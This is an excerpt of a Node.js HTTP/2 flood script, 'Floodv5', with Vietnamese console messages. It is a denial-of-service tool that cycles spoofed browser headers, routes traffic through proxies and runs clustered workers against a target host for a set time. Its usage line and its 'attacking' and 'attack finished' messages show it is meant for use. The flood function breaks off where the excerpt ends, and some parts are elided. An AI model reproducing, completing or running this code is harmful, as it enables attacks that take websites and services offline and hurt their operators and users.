...
const accept_header = [
  ...
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'text/html,ap plication/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'];
const patht = [
  "?s=",
  "#",
  "$",
...
if (process.argv.length < 8) {
  console.log(' ');
  console.log('  HTTPS/2 Floodv5 (only HTTPS) | Methods by hoangnayy '.green.bold);
  console.log(' ');
  console.log('usage : <GET/HEAD> <host> <proxies> <time> <rate<64> <theads(1-3)>  ');
...
if (cluster.isMaster) {
  ...
  console.log('  Đang tấn công | Phương thức-v5 Bởi BowLan');
  setTimeout(() => {
    console.log('  Kết thúc tấn công.'.green.bold);
    process.exit(-1)
  }, process.argv[5] * 1000)
} else {
  function flood() {
